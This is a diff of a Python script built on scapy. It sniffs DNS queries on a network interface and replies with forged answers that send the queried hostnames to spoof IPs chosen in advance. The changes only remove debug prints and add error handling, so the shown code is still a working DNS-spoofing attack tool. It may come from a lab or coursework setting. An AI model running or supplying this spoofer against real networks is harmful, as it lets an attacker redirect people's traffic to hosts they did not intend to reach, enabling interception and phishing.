@@ -6,10 +6,8 @@ from sys import argv
 import netifaces as ni
 
 def dns_spoof(pkt):
-    #print "--------------dns'''''''''''"
     dns = pkt[DNS]
     dns.an = []
-    print dns.qd[0].qname
     #our ip address by default
     if(dns.qr ==  dpkt.dns.DNS_Q and dns.qdcount == 1 and dns.nscount == 0 and dns.ancount == 0 and dns.qd[0].qtype == dpkt.dns.DNS_A and dns.qd[0].qclass == dpkt.dns.DNS_IN):
         hostname=(dns.qd[0].qname)[:-1]
@@ -25,12 +23,8 @@ def dns_spoof(pkt):
                    DNS(id=pkt[DNS].id, qr=dpkt.dns.DNS_R, ra=1,rd=1,
                        qd=pkt[DNS].qd,an=DNSRR(type=dpkt.dns.DNS_A,rclass = dpkt.dns.DNS_IN,rrname=dns.qd[0].qname,ttl=255,rdata=spoof_ip))
         #print("Spoof pkt prepared.")
-        spoofpkt.show()
         send(spoofpkt, verbose=0)
-    else:
-        print "no dns query found"
     return
-        #print ("Sent spoofed pkt")
 
 if __name__=='__main__':
     args={}
@@ -63,5 +57,7 @@ if __name__=='__main__':
             spoof_i = line.split('  ')[0]
             spoof_domain = line.split('  ')[1]
             hostnames[spoof_domain] = spoof_i
-
-    pkts = sniff(iface=interface, filter=user_filter, prn=dns_spoof)
+    try:
+        pkts = sniff(iface=interface, filter=user_filter, prn=dns_spoof)
+    except:
+        print "ERROR::Invalid command"
